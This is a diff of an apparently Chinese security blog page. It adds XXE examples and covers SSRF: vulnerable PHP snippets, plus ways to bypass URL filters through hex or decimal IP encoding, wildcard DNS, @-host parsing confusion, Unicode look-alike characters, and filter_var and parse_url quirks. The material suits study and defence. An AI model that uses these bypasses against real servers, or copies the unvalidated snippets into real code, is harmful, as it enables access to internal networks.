-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="DOMDocument"><a href="#DOMDocument" class="headerlink" title="DOMDocument"></a>DOMDocument</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line"><span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$dom</span>);</span><br></pre></td></tr></table></figure>
 
-<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str=file_get_contents($_GET[<span class="string">'shell'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?shell=http://192.168.110.145/index.html</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="fsocksopen"><a href="#fsocksopen" class="headerlink" title="fsocksopen"></a>fsocksopen</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># 打开连接通道</span></span><br><span class="line">$fp = fsockopen($_GET[<span class="string">'url'</span>], <span class="number">80</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$errstr ($errno)&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># 通道打开，模拟HTTP请求,http协议标准的换行是\r\n</span></span><br><span class="line">    $out = <span class="string">"GET / HTTP/1.1\r\n"</span>;</span><br><span class="line">    $out .= <span class="string">"Host: 127.0.0.1\r\n"</span>;</span><br><span class="line">    $out .= <span class="string">"Connection: Close\r\n\r\n"</span>;</span><br><span class="line">    <span class="comment"># http模拟完成，发送给服务器</span></span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    <span class="comment"># 接受服务器的返回结果</span></span><br><span class="line">    <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?url=192.168.110.145/index.html</span></span><br></pre></td></tr></table></figure>
+<h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="keyword">new</span> SimpleXMLElement(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;name;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="simplexml-load-string"><a href="#simplexml-load-string" class="headerlink" title="simplexml_load_string"></a>simplexml_load_string</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$xml</span> = simplexml_load_string(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;name;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$ch</span> = curl_init(); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">curl_exec(<span class="variable">$ch</span>); </span><br><span class="line">curl_close(<span class="variable">$ch</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span>=file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?shell=http://192.168.110.145/index.html</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="fsocksopen"><a href="#fsocksopen" class="headerlink" title="fsocksopen"></a>fsocksopen</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># 打开连接通道</span></span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>], <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># 通道打开，模拟HTTP请求,http协议标准的换行是\r\n</span></span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="comment"># http模拟完成，发送给服务器</span></span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="comment"># 接受服务器的返回结果</span></span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?url=192.168.110.145/index.html</span></span><br></pre></td></tr></table></figure>
+
 
 <h3 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h3><h4 id="IP转换"><a href="#IP转换" class="headerlink" title="IP转换"></a>IP转换</h4><p>点分式&lt;==&gt;整数形式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1945097072的十六进制表示是73 EF D3 70，每个字节转换成十进制表示就是115.239.211.112 </span><br><span class="line">115.239.211.112每部分准换成16进制是73 EF D3 70，转换成十进制就是1945097072。</span><br></pre></td></tr></table></figure>
-
 <p>放上两个ip转换的脚本</p>
 <p>ip转16进制</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"> </span><br><span class="line">ary=<span class="string">'192.168.1.1'</span></span><br><span class="line">packed_ip_addr = socket.inet_aton(ary)</span><br><span class="line">hexStr=hexlify(packed_ip_addr)</span><br><span class="line">print(<span class="string">'IP:'</span>+str(hexStr))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"> </span><br><span class="line">ary=<span class="string">&#x27;192.168.1.1&#x27;</span></span><br><span class="line">packed_ip_addr = socket.inet_aton(ary)</span><br><span class="line">hexStr=hexlify(packed_ip_addr)</span><br><span class="line">print(<span class="string">&#x27;IP:&#x27;</span>+<span class="built_in">str</span>(hexStr))</span><br></pre></td></tr></table></figure>
+
 
 <p>测试 ok</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ssrf.php?url=http://0xc0a86e01/neiwang.php HTTP/1.1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;0xc0a86e01&#x2F;neiwang.php HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+
 
 <p>ip转整数形式</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IP = <span class="string">"192.168.110.1"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr2dec</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="string">"将点分十进制IP地址转换成十进制整数"</span></span><br><span class="line">    items = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> addr.split(<span class="string">"."</span>)]</span><br><span class="line">    <span class="keyword">return</span> sum([items[i] &lt;&lt; [<span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2addr</span><span class="params">(dec)</span>:</span></span><br><span class="line">    <span class="string">"将十进制整数IP转换成点分十进制的字符串IP地址"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"."</span>.join([str(dec &gt;&gt; x &amp; <span class="number">0xff</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>]])</span><br><span class="line"> </span><br><span class="line">dec = addr2dec(IP)</span><br><span class="line"><span class="keyword">print</span> dec</span><br><span class="line"><span class="keyword">print</span> dec2addr(dec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IP = <span class="string">&quot;192.168.110.1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr2dec</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="string">&quot;将点分十进制IP地址转换成十进制整数&quot;</span></span><br><span class="line">    items = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> addr.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([items[i] &lt;&lt; [<span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2addr</span>(<span class="params">dec</span>):</span></span><br><span class="line">    <span class="string">&quot;将十进制整数IP转换成点分十进制的字符串IP地址&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;.&quot;</span>.join([<span class="built_in">str</span>(dec &gt;&gt; x &amp; <span class="number">0xff</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>]])</span><br><span class="line"> </span><br><span class="line">dec = addr2dec(IP)</span><br><span class="line"><span class="built_in">print</span> dec</span><br><span class="line"><span class="built_in">print</span> dec2addr(dec)</span><br></pre></td></tr></table></figure>
+
 
 <p>测试 ok</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ssrf.php?url=http://3232263681/neiwang.php HTTP/1.1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;3232263681&#x2F;neiwang.php HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
 
-<h4 id="url绕过"><a href="#url绕过" class="headerlink" title="url绕过"></a>url绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.==&gt;。 127。0。0。1  测试 ok</span><br><span class="line">短网址  https://dwz.cn/  测试 没ok</span><br><span class="line">指向任意 ip 的域名xip.io, http://xxx.127.0.0.1.xip.io/  测试 ok  这个要注意xxx随意 但是不能没有</span><br><span class="line">GET /test.php?url=http://x.192.168.110.1.xip.io/neiwang.php HTTP/1.1</span><br></pre></td></tr></table></figure>
 
+<h4 id="url绕过"><a href="#url绕过" class="headerlink" title="url绕过"></a>url绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.&#x3D;&#x3D;&gt;。 127。0。0。1  测试 ok</span><br><span class="line">短网址  https:&#x2F;&#x2F;dwz.cn&#x2F;  测试 没ok</span><br><span class="line">指向任意 ip 的域名xip.io, http:&#x2F;&#x2F;xxx.127.0.0.1.xip.io&#x2F;  测试 ok  这个要注意xxx随意 但是不能没有</span><br><span class="line">GET &#x2F;test.php?url&#x3D;http:&#x2F;&#x2F;x.192.168.110.1.xip.io&#x2F;neiwang.php HTTP&#x2F;1.1</span><br><span class="line">www.baidu.com@127.0.0.1</span><br></pre></td></tr></table></figure>
 <p>变体字符</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
 
-<h4 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var"></a>filter_var</h4><p>使用特定的过滤器 过滤url</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed</span><br></pre></td></tr></table></figure>
 
+
+
+<h4 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var"></a>filter_var</h4><p>使用特定的过滤器 过滤url</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var ( mixed <span class="variable">$variable</span> [, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT [, mixed <span class="variable">$options</span> ]] ) : mixed</span><br></pre></td></tr></table></figure>
 <p>常使用的过滤器</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILTER_VALIDATE_EMAIL 检查是否为有效邮箱</span><br><span class="line">FILTER_VALIDATE_URL 检查是否为有效url</span><br></pre></td></tr></table></figure>
+
 
 <p>绕过</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0://baidu.com:80,google.com</span><br><span class="line">0://baidu.com:80;google.com  </span><br><span class="line">0://baidu<span class="variable">$goolge</span>.com  //利用bash的可变变量<span class="variable">$google</span>被解析为空  只使用curl </span><br><span class="line">data://text.google.com/plain;base64,[code]  这里是可以xss的</span><br></pre></td></tr></table></figure>
 
-<h4 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h4><p><a href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/#%E5%AE%9E%E6%88%98%E4%B8%80" target="_blank" rel="noopener">https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/#%E5%AE%9E%E6%88%98%E4%B8%80</a></p>
+
+
+
+<h4 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h4><p><a class="link" target="_blank" rel="noopener" href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/#%E5%AE%9E%E6%88%98%E4%B8%80">https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/#%E5%AE%9E%E6%88%98%E4%B8%80<i class="fas fa-external-link-alt"></i></a></p>
 <h5 id="no-1-遇到-会返回flase"><a href="#no-1-遇到-会返回flase" class="headerlink" title="no.1 遇到///会返回flase"></a>no.1 遇到///会返回flase</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost///web/trick1/parse.php?sql=select</span></span><br><span class="line">直接返回flase</span><br></pre></td></tr></table></figure>
+<h5 id="no-2-遇到-把data当作path"><a href="#no-2-遇到-把data当作path" class="headerlink" title="no.2 遇到//把data当作path"></a>no.2 遇到//把data当作path</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;trick1&#x2F;&#x2F;parse2.php?&#x2F;home&#x2F;binarycloud&#x2F;</span><br><span class="line">则会被当做相对url，</span><br><span class="line">此时的parse2.php?&#x2F;home&#x2F;binarycloud&#x2F;都会被当做是data[‘path’]</span><br><span class="line">而不再是query，导致可以绕过过滤</span><br><span class="line">但是需要注意的是：此问题存在php5.4.7以前</span><br></pre></td></tr></table></figure>
 
-<h5 id="no-2-遇到-把data当作path"><a href="#no-2-遇到-把data当作path" class="headerlink" title="no.2 遇到//把data当作path"></a>no.2 遇到//把data当作path</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/web/trick1//parse2.php?/home/binarycloud/</span><br><span class="line">则会被当做相对url，</span><br><span class="line">此时的parse2.php?/home/binarycloud/都会被当做是data[‘path’]</span><br><span class="line">而不再是query，导致可以绕过过滤</span><br><span class="line">但是需要注意的是：此问题存在php5.4.7以前</span><br></pre></td></tr></table></figure>
 
-<h5 id="no-3-遇到非法字符自动转为下划线"><a href="#no-3-遇到非法字符自动转为下划线" class="headerlink" title="no.3 遇到非法字符自动转为下划线_"></a>no.3 遇到非法字符自动转为下划线_</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=%<span class="number">11</span> </span><br><span class="line">变成了下划线</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">"path"</span>]=&gt; string(<span class="number">1</span>) <span class="string">"_"</span> &#125;</span><br></pre></td></tr></table></figure>
+<h5 id="no-3-遇到非法字符自动转为下划线"><a href="#no-3-遇到非法字符自动转为下划线" class="headerlink" title="no.3 遇到非法字符自动转为下划线_"></a>no.3 遇到非法字符自动转为下划线_</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=%<span class="number">11</span> </span><br><span class="line">变成了下划线</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">&quot;path&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;_&quot;</span> &#125; </span><br></pre></td></tr></table></figure>
 
-<h5 id="no-4-解析host"><a href="#no-4-解析host" class="headerlink" title="no.4 解析host"></a>no.4 解析host</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$url = <span class="string">'http://username:password@hostname:9090/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parse_url解析的结果是</span><br><span class="line">?url=http:<span class="comment">//www.baidu.com@192.168.110.140</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123; [<span class="string">"scheme"</span>]=&gt; string(<span class="number">4</span>) <span class="string">"http"</span> [<span class="string">"host"</span>]=&gt; string(<span class="number">15</span>) <span class="string">"192.168.110.140"</span> [<span class="string">"user"</span>]=&gt; string(<span class="number">13</span>) <span class="string">"www.baidu.com"</span> &#125; </span><br><span class="line">host变成了@后面的</span><br></pre></td></tr></table></figure>
+
+<h5 id="no-4-解析host"><a href="#no-4-解析host" class="headerlink" title="no.4 解析host"></a>no.4 解析host</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parse_url解析的结果是</span><br><span class="line">?url=http:<span class="comment">//www.baidu.com@192.168.110.140</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123; [<span class="string">&quot;scheme&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span> [<span class="string">&quot;host&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;192.168.110.140&quot;</span> [<span class="string">&quot;user&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;www.baidu.com&quot;</span> &#125; </span><br><span class="line">host变成了@后面的</span><br></pre></td></tr></table></figure>
+
 
 <p>host利用深入</p>
 <h4 id="libcurl和parse-url的解析差异"><a href="#libcurl和parse-url的解析差异" class="headerlink" title="libcurl和parse_url的解析差异"></a>libcurl和parse_url的解析差异</h4><p>parse_url</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host: 匹配最后一个@后面符合格式的host</span><br></pre></td></tr></table></figure>
-
 <p>libcurl</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host：匹配第一个@后面符合格式的host</span><br></pre></td></tr></table></figure>
-
 <p>测试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://u:p@a.com:80@b.com/index.php</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;u:p@a.com:80@b.com&#x2F;index.php</span><br></pre></td></tr></table></figure>
 <p>parse_url解析结果</p>
